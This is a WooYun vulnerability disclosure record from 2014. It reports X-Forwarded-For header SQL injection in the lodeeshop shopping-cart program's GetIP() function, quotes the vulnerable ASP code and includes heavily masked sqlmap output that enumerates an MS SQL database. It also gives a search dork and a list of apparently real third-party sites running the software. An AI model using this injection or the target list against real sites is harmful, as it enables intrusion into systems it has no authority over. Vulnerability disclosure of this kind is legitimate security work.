{"id": 43617, "wybug_id": "wooyun-2014-082233", "wybug_title": "lodeeshop 商城程序 核心注入问题", "wybug_corp": "lodeeshop", "wybug_author": "ra0mb1er", "wybug_date": "2014-11-27 14:22", "wybug_open_date": "2015-02-25 14:24", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-27：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-02-25：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 核心函数存在问题 详细说明：  问题出现在func.asp  GetIP()函数上\nFunction GetIP()Dim MyIPMyIP = Request.ServerVariables(\"HTTP_X_FORWARDED_FOR\")If MyIP = \"\" Then MyIP = Request.ServerVariables(\"REMOTE_ADDR\")GetIP = MyIP End Function\n  典型的X_forwarded_for http 头注入，这个CMS 虽然做的防注入 用的是360的那个safe 脚本，好蛋疼。但是却出现了这个 问题，前面的防注入都是空话 \n\n以下文件都调用了  这个函数。   漏洞证明：  官方测试deomo \n\n\n\nmask 区域\n*****txt --level 3 --db**********   **********_  {1.0-dev-********** | .**********_|_|_|*****1.://**.**.**//sqlmap.org_*************** for attacking targ**********'s responsibili**********pers assume no liab**********amage caused ********************g at 1********************P request from **********039;) found in option &********** want to process ********** connection t**********cted web page cha**********tion points with a **********:**********-**********tom) H**********rwarded-**********rror-b**********e AND error-based -**********VERT(INT,(SELECT CHA**********N (2493=2493) THEN **********02)+CHAR(113))) AND &********************NION q**********N query (NUL**********LECT CHAR(113)+CHAR(**********AR(88)+CHAR(108)+CH**********(105)+CHAR(122)+C********************tacked**********Server/Sybase**********AITFOR DELAY ********************R time-b**********Server/Sybase**********ITFOR DELAY **********-**********ting Micros**********rming Micros**********ed web page charse**********end DBMS is Mi**********stem: Window**********y: ASP.NET, M**********osoft SQL **********etching da********** query used r**********etrieved: **********etrieved: ********** retrieve********** retrieve********** retrieve**********O] retri********** retrieve********** retrieve********** retrieve********** retrieve********** retrieve********** retrieve********** retrieve********** retrieve********** retrieve********** retrieve********** retrieve********** retrieve********** retrieve********** retrieve********** retrieve********** retrieve********** retrieve********** retrieve********** retrieve********** retrieve********** retrieve********** retrieve**********etrieved: ********** retrieve********** retrieve**********etrieved: **********eved: Report********** retrieve**********rieved: sq_********** retrieve********** retrieve********** retrieve**********atabas**********ipin**********o_gi**********ast**********ode**********sdb**********demo**********demo**********demo**********demo**********demo**********demo**********demo**********demo**********demo**********demo**********demo**********demo**********demo**********j_d**********j_d**********j_d**********j_d**********j_d**********j_d**********j_d**********demo**********j_t**********j_t**********ortS**********erverT**********17po**********andan**********tz18**********emp**********eso********************rror codes det**********ver Error**********o text files under &**********oeshop.c********************down at*****\n\n实例 inurl:messagemanagement.asphttp://www.hodosp.com/messagemanagement.asp?ld_MM=addNewhttp://www.sdlq.cn/messagemanagement.asp?ld_MM=addNewhttp://www.fotondaimler.cn/messagemanagement.asp?ld_MM=addNewhttp://www.jyf98.com/messagemanagement.asp?ld_MM=addNewhttp://www.jieshuwang.com/messagemanagement.asp?ld_MM=addNew   修复方案：     版权声明：转载请注明来源 ra0mb1er@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}